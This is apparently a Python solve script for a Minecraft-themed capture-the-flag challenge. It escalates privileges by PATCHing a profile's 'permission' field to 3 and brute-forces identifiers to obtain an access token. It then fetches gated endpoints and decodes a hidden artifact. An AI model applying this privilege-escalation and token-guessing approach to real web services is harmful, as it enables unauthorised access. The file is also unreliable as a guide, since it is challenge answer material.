#!/usr/bin/env python3
import requests, json, re, base64

BASE = 'https://m1n3-cr4f7.onrender.com'
s = requests.Session()
s.get(BASE, timeout=30)

# Step 1: Elevate to Operator
r = s.patch(BASE + '/api/v2/player/profile', json={'permission': 3},
            headers={'Accept': 'application/json'}, timeout=15)
print('[1] Elevation:', r.json())
print()

# Step 2: Get seed fragments
r = s.get(BASE + '/api/operator/fragments', timeout=15)
print('[2] Fragments:', r.status_code)
print(json.dumps(r.json(), indent=2))
frag_data = r.json()
print()

# Step 3: Compute Nether coords from overworld rift (10720, -2040) / 8
# Operator audit log: "Overworld rift epicenter anchored at (10720, -2040)"
ow_x, ow_z = 10720, -2040
nether_x = ow_x // 8  # 1340
nether_z = ow_z // 8  # -255
print(f'[3] Nether coords: X={nether_x}, Z={nether_z}')

# Check what coordinates the fragments suggest
if 'calculatedOverworldCoordinates' in frag_data:
    coords = frag_data['calculatedOverworldCoordinates'].get('coordinates', {})
    frag_x = coords.get('x', ow_x)
    frag_z = coords.get('z', ow_z)
    print(f'    Fragments suggest overworld: X={frag_x}, Z={frag_z}')
    nether_x = frag_x // 8
    nether_z = frag_z // 8
    print(f'    Adjusted Nether coords: X={nether_x}, Z={nether_z}')
print()

# Step 4: Scan Nether chunk
r = s.get(BASE + f'/api/nether/chunk/{nether_x}/{nether_z}', timeout=15)
print(f'[4] Nether chunk ({nether_x},{nether_z}):', r.status_code)
print(json.dumps(r.json(), indent=2))
nether_data = r.json()
print()

# Also try with the loot table if provided
if nether_data.get('loot_table'):
    r2 = s.get(nether_data['loot_table'], timeout=15)
    print('[4b] Loot table:', r2.status_code, r2.text[:500])
    print()

# Step 5: Activate stronghold portal to get enderEyeToken
# Try different identifiers
for identifier in ['Chunk_0x84', 'ancient_city', 'ancient-command-block',
                   'Fragment_C', 'Chunk_0x84_quarantine', 'stronghold',
                   'portal', 'ender', str(nether_x), str(nether_z)]:
    r = s.post(BASE + '/api/stronghold/activate',
               json={'identifier': identifier},
               headers={'Accept': 'application/json'},
               timeout=15)
    data = r.json()
    print(f'[5] Stronghold activate ({identifier}):', r.status_code, json.dumps(data)[:300])
    if data.get('enderEyeToken'):
        print(f'  *** GOT ENDER EYE TOKEN: {data["enderEyeToken"]} ***')
        eye_token = data['enderEyeToken']
        break
else:
    eye_token = None
print()

# Step 6: Deep Dark scan with ender eye token
if eye_token:
    # Try the fragment coordinates in deep dark
    for x, z in [(84, -84), (nether_x, nether_z), (ow_x, ow_z), (1340, -255), (0, 0)]:
        r = s.get(BASE + f'/api/deepdark/chunk/{x}/{z}',
                  headers={'X-Ender-Eye': eye_token},
                  timeout=15)
        print(f'[6] Deep dark ({x},{z}):', r.status_code)
        try:
            data = r.json()
            print(json.dumps(data, indent=2))
            if data.get('artifact_endpoint'):
                print(f'  *** ARTIFACT ENDPOINT: {data["artifact_endpoint"]} ***')
                # Step 7: Fetch the artifact
                r2 = s.get(BASE + data['artifact_endpoint'],
                           headers={'X-Ender-Eye': eye_token},
                           timeout=15)
                print('[7] Artifact:', r2.status_code)
                print(json.dumps(r2.json(), indent=2))
                art = r2.json()
                # Try decoding
                if art.get('encoding') == 'base64' and art.get('data'):
                    decoded = base64.b64decode(art['data']).decode('utf-8', errors='replace')
                    print(f'  Decoded: {decoded}')
        except Exception as e:
            print('  Error:', e, r.text[:300])
        print()
